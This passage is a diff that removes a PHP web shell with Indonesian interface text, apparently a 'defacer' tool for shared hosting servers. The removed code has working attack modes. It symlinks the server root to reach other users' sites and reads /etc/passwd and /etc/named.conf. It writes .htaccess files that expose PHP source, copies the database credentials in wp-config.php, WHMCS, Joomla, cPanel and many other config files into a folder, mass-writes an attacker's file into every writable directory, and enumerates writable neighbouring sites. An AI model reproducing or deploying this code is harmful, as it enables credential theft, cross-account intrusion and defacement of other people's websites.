-                    $user = posix_getpwuid(@fileowner('/etc/valiases/'.$domsws[1][0]));
-                    flush();
-                    $site = $user['name'];
-                    @symlink('/', 'sym/root');
-                    $site = $domsws[1][0];
-                    $ir = 'ir';
-                    $il = 'il';
-                    if (preg_match("/.^$ir/", $domsws[1][0]) or preg_match("/.^$il/", $domsws[1][0])) {
-                        $site = ".$domsws[1][0].";
-                    }
-                    echo "
-                                <tr>
-                                    <td>
-                                        <a target='_blank' href=http://www.".$domsws[1][0].'/>'.$site.' </a>
-                                    </td>
-                                    <td>
-                                        '.$user['name']."
-                                    </td>
-                                    <td>
-                                        <a href='sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a>
-                                    </td>
-                                </tr>";
-                    flush();
-                    flush();
-                }
-            }
-        }
-        echo '</table>
-            </div><br/>';
-    }
-    exit;
-}
-
-if ($_GET['symread'] == 'defacer') {
-    echo '<center>read /etc/named.conf';
-    echo "<form method='post' action='?path=$dir&symread=defacer&save=1'>
-            <textarea class='form-control' rows='15' cols='50' name='file'>";
-    flush();
-    flush();
-    $file = '/etc/named.conf';
-    $r3ad = @fopen($file, 'r');
-    if ($r3ad) {
-        $content = @fread($r3ad, @filesize($file));
-        echo ''.htmlentities($content).'';
-    } elseif (!$r3ad) {
-        $r3ad = @highlight_file($file);
-    } elseif (!$r3ad) {
-        $r3ad = @highlight_file($file);
-    } elseif (!$r3ad) {
-        $sm = @symlink($file, 'sym.txt');
-        if ($sm) {
-            $r3ad = @fopen('sym/sym.txt', 'r');
-            $content = @fread($r3ad, @filesize($file));
-            echo ''.htmlentities($content).'';
-        }
-    }
-    echo "</textarea><br/><input type='submit' class='button' value='Save'/> </form>";
-    if (isset($_GET['save'])) {
-        $cont = stripcslashes($_POST['file']);
-        $f = fopen('named.txt', 'w');
-        $w = fwrite($f, $cont);
-        if ($w) {
-            echo '<br/>save has been successfully</center>';
-        }
-        fclose($f);
-    }
-    exit;
-}
-
-if ($_GET['sym_404'] == 'defacer') {
-    echo '<center><h2>Symlink 404</h2>
-        <form method="post">
-            File Target: <input type="text" class="form-control" name="dir" style="width: 250px;height: 20px;" value="/home/public_html/wp-config.php"><br><br>
-            Save As: <input type="text" class="form-control" name="isi" style="width: 100px;height: 20px;" placeholder="file.txt"/><br><br/>
-            <input type="submit" class="button" value="Execute" name="execute"/>
-        </form></center>';
-    if ($_POST['execute']) {
-        rmdir('defacer_sym404');
-        mkdir('defacer_sym404', 0777);
-        $dir = $_POST['dir'];
-        $isi = $_POST['isi'];
-        system('ln -s '.$dir.'defacer_sym404/'.$isi);
-        symlink($dir, 'defacer_sym404/'.$isi);
-        $inija = fopen('defacer_sym404/.htaccess', 'w');
-        fwrite($inija, 'ReadmeName '.$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
-        echo'<a href="/defacer_sym404/" target="_blank"> >>Sukses<< </a>';
-    }
-    exit;
-}
-
-if ($_GET['sym_bypas'] == 'defacer') {
-    if (isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0) {
-        $cont = stripcslashes($_POST['file']);
-        if (!file_exists('passwd.txt')) {
-            $f = @fopen('passwd.txt', 'w');
-            $w = @fwrite($f, $cont);
-            fclose($f);
-        }
-        if ($w or @filesize('passwd.txt') > 0) {
-            echo "<div class='tmp mb-4'>
-                    <table width='100%'>
-                        <thead class='bg-info text-center'>
-                            <th>Users</th>
-                            <th>symlink</th>
-                            <th>FTP</th>
-                        </thead>";
-            flush();
-            $fil3 = file('passwd.txt');
-            foreach ($fil3 as $f) {
-                $u = explode(':', $f);
-                $user = $u['0'];
-                echo "<tr class='text-dark'>
-                                <td class='text-left pl-1'>$user</td>
-                                <td>
-                                    <a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
-                                </td>
-                                <td>
-                                    <a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
-                                </td>
-                            </tr>";
-                flush();
-                flush();
-            }
-            die('</tr></table></div>');
-        }
-    }
-
-    echo '<center>read /etc/passwd';
-    echo "<br/><form method='post' action='?path=$lokasi&sym_bypas=defacer&save=1'>
-            <textarea class='form-control' rows='15' cols='50' name='file'>";
-    flush();
-    $file = '/etc/passwd';
-    $r3ad = @fopen($file, 'r');
-    if ($r3ad) {
-        $content = @fread($r3ad, @filesize($file));
-        echo ''.htmlentities($content).'';
-    } elseif (!$r3ad) {
-        $r3ad = @highlight_file($file);
-    } elseif (!$r3ad) {
-        $r3ad = @highlight_file($file);
-    } elseif (!$r3ad) {
-        for ($uid = 0; $uid < 1000; $uid++) {
-            $ara = posix_getpwuid($uid);
-            if (!empty($ara)) {
-                while (list($key, $val) = each($ara)) {
-                    echo "$val:";
-                }
-                echo "\n";
-            }
-        }
-    }
-    flush();
-    echo "</textarea><br/>
-            <input type='submit' class='button' value='Symlink'/><br/>
-        </form></center>";
-    flush();
-    exit;
-
-} elseif ($_REQUEST['config'] == "defacer") {
-	$etc = fopen('/etc/passwd', 'r') or die("<center><pre><font color=red>Can't read /etc/passwd</font></pre></center>");
-    $con = mkdir('defacer_config', 0777);
-    $isi_htc = "Options all\nRequire None\nSatisfy Any";
-    $htc = fopen('defacer_config/.htaccess', 'w');
-    fwrite($htc, $isi_htc);
-    while ($passwd = fgets($etc)) {
-        if ($passwd == '' || !$etc) {
-            echo "<font color=red>Can't read /etc/passwd</font>";
-        } else {
-            preg_match_all('/(.*?):x:/', $passwd, $user_config);
-            foreach ($user_config[1] as $user_con) {
-                $user_config_dir = "/home/$user_con/public_html/";
-                if (is_readable($user_config_dir)) {
-                    $grab_config =
-                    [
-                        "/home/$user_con/.my.cnf" => 'cpanel',
-                        "/home/$user_con/public_html/config/koneksi.php" => 'Lokomedia',
-                        "/home/$user_con/public_html/forum/config.php" => 'phpBB',
-                        "/home/$user_con/public_html/sites/default/settings.php" => 'Drupal',
-                        "/home/$user_con/public_html/config/settings.inc.php" => 'PrestaShop',
-                        "/home/$user_con/public_html/app/etc/local.xml" => 'Magento',
-                        "/home/$user_con/public_html/admin/config.php" => 'OpenCart',
-                        "/home/$user_con/public_html/application/config/database.php" => 'Ellislab',
-                        "/home/$user_con/public_html/vb/includes/config.php" => 'Vbulletin',
-                        "/home/$user_con/public_html/includes/config.php" => 'Vbulletin',
-                        "/home/$user_con/public_html/forum/includes/config.php" => 'Vbulletin',
-                        "/home/$user_con/public_html/forums/includes/config.php" => 'Vbulletin',
-                        "/home/$user_con/public_html/cc/includes/config.php" => 'Vbulletin',
-                        "/home/$user_con/public_html/inc/config.php" => 'MyBB',
-                        "/home/$user_con/public_html/includes/configure.php" => 'OsCommerce',
-                        "/home/$user_con/public_html/shop/includes/configure.php" => 'OsCommerce',
-                        "/home/$user_con/public_html/os/includes/configure.php" => 'OsCommerce',
-                        "/home/$user_con/public_html/oscom/includes/configure.php" => 'OsCommerce',
-                        "/home/$user_con/public_html/products/includes/configure.php" => 'OsCommerce',
-                        "/home/$user_con/public_html/cart/includes/configure.php" => 'OsCommerce',
-                        "/home/$user_con/public_html/inc/conf_global.php" => 'IPB',
-                        "/home/$user_con/public_html/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/wp/test/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/blog/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/beta/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/portal/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/site/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/wp/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/WP/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/news/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/wordpress/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/test/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/demo/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/home/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/v1/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/v2/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/press/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/new/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/blogs/wp-config.php" => 'Wordpress',
-                        "/home/$user_con/public_html/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/blog/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/submitticket.php" => '^WHMCS',
-                        "/home/$user_con/public_html/cms/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/beta/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/portal/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/site/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/main/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/home/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/demo/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/test/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/v1/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/v2/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/joomla/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/new/configuration.php" => 'Joomla',
-                        "/home/$user_con/public_html/WHMCS/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/whmcs1/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Whmcs/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/WHMC/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Whmc/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/whmc/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/WHM/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Whm/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/whm/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/HOST/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Host/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/host/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/SUPPORTES/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Supportes/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/supportes/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/domains/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/domain/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Hosting/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/HOSTING/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/hosting/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/CART/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Cart/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/cart/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/ORDER/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Order/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/order/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/CLIENT/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Client/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/client/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/CLIENTAREA/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Clientarea/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/clientarea/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/SUPPORT/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Support/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/support/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/BILLING/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Billing/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/billing/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/BUY/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Buy/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/buy/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/MANAGE/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Manage/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/manage/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/ClientSupport/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Clientsupport/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/clientsupport/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/CHECKOUT/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Checkout/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/checkout/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/BASKET/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Basket/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/basket/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/SECURE/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Secure/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/secure/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/SALES/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Sales/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/sales/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/BILL/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Bill/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/bill/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/PURCHASE/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Purchase/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/purchase/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/ACCOUNT/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Account/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/account/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/USER/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/User/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/user/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/CLIENTS/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Clients/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/clients/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/MY/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/My/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/my/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/secure/whm/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/secure/whmcs/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/panel/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/clientes/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/cliente/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/support/order/submitticket.php" => 'WHMCS',
-                        "/home/$user_con/public_html/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/boxbilling/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/box/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/host/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/Host/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/supportes/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/support/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/hosting/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/cart/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/order/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/client/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/clients/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/cliente/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/clientes/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/billing/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/billings/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/my/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/secure/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/support/order/bb-config.php" => 'BoxBilling',
-                        "/home/$user_con/public_html/includes/dist-configure.php" => 'Zencart',
-                        "/home/$user_con/public_html/zencart/includes/dist-configure.php" => 'Zencart',
-                        "/home/$user_con/public_html/products/includes/dist-configure.php" => 'Zencart',
-                        "/home/$user_con/public_html/cart/includes/dist-configure.php" => 'Zencart',
-                        "/home/$user_con/public_html/shop/includes/dist-configure.php" => 'Zencart',
-                        "/home/$user_con/public_html/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/hostbills/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/host/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/Host/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/supportes/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/support/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/hosting/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/cart/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/order/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/client/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/clients/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/cliente/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/clientes/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/billing/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/billings/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/my/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/secure/includes/iso4217.php" => 'Hostbills',
-                        "/home/$user_con/public_html/support/order/includes/iso4217.php" => 'Hostbills',
-                    ];
-                    foreach ($grab_config as $config => $nama_config) {
-                        $ambil_config = file_get_contents($config);
-                        if ($ambil_config == '') {
-                        } else {
-                            $file_config = fopen("defacer_config/$user_con-$nama_config.txt", 'w');
-                            fwrite($file_config, $ambil_config);
-                        }
-                    }
-                }
-            }
-        }
-    }
-    echo "<center><a href='?path=$lokasi/defacer_config'><font color=lime>Done</font></a></center>";
-    exit;
-
-} elseif ($_REQUEST['mass'] == "defacer") {
-	function sabun_massal($dir,$namafile,$isi_script) {
-		if(is_writable($dir)) {
-			$dira = scandir($dir);
-			foreach($dira as $dirb) {
-				$dirc = "$dir/$dirb";
-				$lokasi = $dirc.'/'.$namafile;
-				if($dirb === '.') {
-					file_put_contents($lokasi, $isi_script);
-				} elseif($dirb === '..') {
-					file_put_contents($lokasi, $isi_script);
-				} else {
-					if(is_dir($dirc)) {
-						if(is_writable($dirc)) {
-							echo "$lokasi<br>";
-							file_put_contents($lokasi, $isi_script);
-							$idx = sabun_massal($dirc,$namafile,$isi_script);
-						}
-					}
-				}
-			}
-		}
-	}
-	function sabun_biasa($dir,$namafile,$isi_script) {
-		if(is_writable($dir)) {
-			$dira = scandir($dir);
-			foreach($dira as $dirb) {
-				$dirc = "$dir/$dirb";
-				$lokasi = $dirc.'/'.$namafile;
-				if($dirb === '.') {
-					file_put_contents($lokasi, $isi_script);
-				} elseif($dirb === '..') {
-					file_put_contents($lokasi, $isi_script);
-				} else {
-					if(is_dir($dirc)) {
-						if(is_writable($dirc)) {
-							echo "$dirb/$namafile<br>";
-							file_put_contents($lokasi, $isi_script);
-						}
-					}
-				}
-			}
-		}
-	}
-	if($_POST['start']) {
-		if($_POST['tipe_sabun'] == 'mahal') {
-			echo "<div style='margin: 5px auto; padding: 5px'>";
-			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
-			echo "</div>";
-		} elseif($_POST['tipe_sabun'] == 'murah') {
-			echo "<div style='margin: 5px auto; padding: 5px'>";
-			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
-			echo "</div>";
-		}
-} else {
-	echo "<center>";
-	echo "<form method='post'>
-	<font style='text-decoration: ;'>Tipe :</font><br>
-	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br><br>
-	<font style='text-decoration: ;'>Directory:</font><br>
-	<input type='text' name='d_dir' value='$lokasi' style='width: 450px;height: 20px;'><br>
-	<font style='text-decoration: ;'>Nama File :</font><br>
-	<input type='text' name='d_file' value='' style='width: 450px;height: 20px;' placeholder='Nama File'><br>
-	<font style='text-decoration: ;'>isi File :</font><br>
-	<textarea name='script' style='width: 600px; height: 250px;' placeholder='isi script'></textarea><br>
-	<input type='submit' class='button' name='start' value='Gass' style='width: 450px;'>
-	</form></center><br>";
-}
-exit;
-} elseif($_GET['jump'] == 'defacer') {
-	$i = 0;
-	echo "<center>Jumping server<center><br>	<div class='margin: 5px auto;'>";
-	if(preg_match("/hsphere/", $dir)) {
-		$urls = explode("\r\n", $_POST['url']);
-		if(isset($_POST['jump'])) {
-			echo "<pre>";
-			foreach($urls as $url) {
-				$url = str_replace(array("http://","www."), "", strtolower($url));
-				$etc = "/etc/passwd";
-				$f = fopen($etc,"r");
-				while($gets = fgets($f)) {
-					$pecah = explode(":", $gets);
-					$user = $pecah[0];
-					$dir_user = "/hsphere/local/home/$user";
-					if(is_dir($dir_user) === true) {
-						$url_user = $dir_user."/".$url;
-						if(is_readable($url_user)) {
-							$i++;
-							$jrw = "[<font color=lime>R</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
-							if(is_writable($url_user)) {
-								$jrw = "[<font color=lime>RW</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
-							}
-							echo $jrw."<br>";
-						}
-					}
-				}
-			}
-		if($i == 0) { 
-		} else {
-			echo "<br>Total ada ".$i." Kamar di ".$ip;
-		}
-		echo "</pre>";
-		} else {
-			echo '<center>
-				  <form method="post">
-				  List Domains: <br>
-				  <textarea name="url" style="width: 500px; height: 250px;">';
-			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
-			while($getss = fgets($fp)) {
-				echo $getss;
-			}
-			echo  '</textarea><br>
-				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
-				  </form></center>';
-		}
-	} elseif(preg_match("/vhosts|vhost/", $dir)) {
-		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
-		$urls = explode("\r\n", $_POST['url']);
-		if(isset($_POST['jump'])) {
-			echo "<pre>";
-			foreach($urls as $url) {
-				$url = str_replace("www.", "", $url);
-				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
-				if(is_dir($web_vh) === true) {
-					if(is_readable($web_vh)) {
-						$i++;
-						$jrw = "[<font color=lime>R</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
-						if(is_writable($web_vh)) {
-							$jrw = "[<font color=lime>RW</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
-						}
-						echo $jrw."<br>";
-					}
-				}
-			}
-		if($i == 0) { 
-		} else {
-			echo "<br>Total ada ".$i." Kamar di ".$ip;
-		}
-		echo "</pre>";
-		} else {
-			echo '<center>
-				  <form method="post">
-				  List Domains: <br>
-				  <textarea name="url" style="width: 500px; height: 250px;">';
-				  bing("ip:$ip");
-			echo  '</textarea><br>
-				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
-				  </form></center>';
-		}
-	} else {
-		echo "<pre>";
-		$etc = fopen("/etc/passwd", "r") or die("<center><font color=red>Can't read /etc/passwd</font></center>");
-		while($passwd = fgets($etc)) {
-			if($passwd == '' || !$etc) {
-				echo "<center><font color=red>Can't read /etc/passwd</font></center>";
-			} else {
-				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
-				foreach($user_jumping[1] as $user_idx_jump) {
-					$user_jumping_dir = "/home/$user_idx_jump/public_html";
-					if(is_readable($user_jumping_dir)) {
-						$i++;
-						$jrw = "[<font color=lime>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
-						if(is_writable($user_jumping_dir)) {
-							$jrw = "[<font color=lime>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
-						}
-						echo $jrw;
-						if(function_exists('posix_getpwuid')) {
-							$domain_jump = file_get_contents("/etc/named.conf");	
-							if($domain_jump == '') {
-								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
-							} else {
-								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
-								foreach($domains_jump[1] as $dj) {
-									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
-									$user_jumping_url = $user_jumping_url['name'];
-									if($user_jumping_url == $user_idx_jump) {
-										echo " => ( <u>$dj</u> )<br>";
-										break;
-									}
-								}
-							}
-						} else {
-							echo "<br>";
-						}
-					}
-				}
-			}
-		}
-		if($i == 0) { 
-		} else {
-			echo "<br>Total ada ".$i." Kamar di ".$ip;
-		}
-		echo "</pre>";
-	}
-	
-	echo "</div>";}
-	elseif ($_REQUEST['buatfile'] == "defacer") {
-		echo "<center>
-    <form method='POST'>
-        <input type='text' class='form-control' value='$lokasi/filekamu.php' style='width: 400px;' name='nama_file' autocomplete='off' placeholder='Nama File...'><br><br/>
-        <textarea name='isi_file' class='form-control' rows='15' cols='70' placeholder='Isi File...'></textarea><br/>
-        <button type='sumbit' class='button' name='bikin'>Bikin!!</button><br><br/>
-    </form></center>";
-
-    if (isset($_POST['bikin'])) {
-        $nama_file = $_POST['nama_file'];
-        $isi_file = $_POST['isi_file'];
-        $handle = fopen("$nama_file", 'w');
-
-        if (fwrite($handle, $isi_file)) {
-            echo '<center>File Berhasil dibuat !!&nbsp;<font color="gold"><i>'.$nama_file.'</i></font><br><br></center>';
-        } else {
-            echo '<script>alert("File Gagal Dibuat");</script>';
-        }
-    }
-}
-elseif ($_REQUEST['info'] == "defacer") {
-	echo "<br><hr>";
-	echo "Server IP : <font color=gold>".ipserv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER['REMOTE_ADDR']."</font><br>";
-	echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
-	echo "System : <font color='gold'>".php_uname()."</font><br>";
-	echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
-	echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
-	echo "Disable Function : ".$disf."</font><br>";
-	echo "MySQL : ";
-	echo "<hr><br>";}
-
-
-if (!is_readable($lokasi)) {
-    die("<center>This directory is unreadable :(</center>");
-}
-
-echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr class="first">
-<td><center>Name</center></td>
-<td><center>Size</center></td>
-<td><center>Last Modified</center></td>
-<td><center>Owner</center></td>
-<td><center>Permissions</center></td>
-<td><center>Options</center></td>
-</tr>';
-
-foreach($lokasinya as $dir){
-    if(!is_dir($lokasi."/".$dir) || $dir == '.') continue;
-    echo "<tr>
-    <td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
-    <td><center>--</center></td>
-    <td><center>".filedate($lokasi."/".$dir)."</center></td>
-    <td>".owner($lokasi."/".$dir)."</td>
-    <td><center>";
-    if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
-    elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
-    echo statusnya($lokasi."/".$dir);
-    if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';
-
-    echo "</center></td>
-    <td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
-    <select name=\"pilih\">
-    <option value=\"\"></option>
-    <option value=\"hapus\">Delete</option>
-    <option value=\"gantinama\">Rename</option>
-    </select>
-    <input type=\"hidden\" name=\"type\" value=\"dir\">
-    <input type=\"hidden\" name=\"name\" value=\"$dir\">
-    <input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
-    <input type=\"submit\" class=\"gas\" value=\">\" />
-    </form></center></td>
-    </tr>";
-}
-
-echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
